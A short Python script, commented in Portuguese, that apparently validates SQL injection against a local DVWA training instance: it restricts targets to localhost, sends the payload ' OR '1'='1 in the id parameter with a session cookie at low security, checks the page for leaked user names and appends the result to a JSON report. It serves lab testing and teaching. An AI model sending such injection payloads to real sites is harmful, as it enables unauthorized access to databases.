"""Validação controlada de SQLi em uma instância DVWA local."""
import json
import os
import time
from pathlib import Path
from urllib.parse import urlparse

import requests

URL = os.getenv("DVWA_SQLI_URL", "http://localhost:8080/vulnerabilities/sqli/")
SESSION_ID = os.getenv("DVWA_PHPSESSID", "")
PAYLOAD = "' OR '1'='1"


def only_local(url: str) -> None:
    if urlparse(url).hostname not in {"localhost", "127.0.0.1", "::1"}:
        raise ValueError("Este script aceita somente URLs locais do laboratório.")


def save_result(data: dict) -> None:
    report = Path(__file__).parents[1] / "resultados" / "relatorio_testes.json"
    entries = json.loads(report.read_text(encoding="utf-8")) if report.exists() else []
    entries.append(data)
    report.write_text(json.dumps(entries, ensure_ascii=False, indent=2), encoding="utf-8")


def main() -> None:
    only_local(URL)
    if not SESSION_ID:
        raise SystemExit("Defina DVWA_PHPSESSID após autenticar-se no DVWA.")
    started = time.perf_counter()
    response = requests.get(URL, params={"id": PAYLOAD, "Submit": "Submit"},
                            cookies={"PHPSESSID": SESSION_ID, "security": "low"}, timeout=10)
    vulnerable = "First name:" in response.text and "Surname:" in response.text
    result = {"teste": "sql_injection", "sucesso": vulnerable, "tentativas": 1,
              "tempo_segundos": round(time.perf_counter() - started, 3),
              "payload": PAYLOAD}
    save_result(result)
    print(json.dumps(result, ensure_ascii=False))


if __name__ == "__main__":
    main()
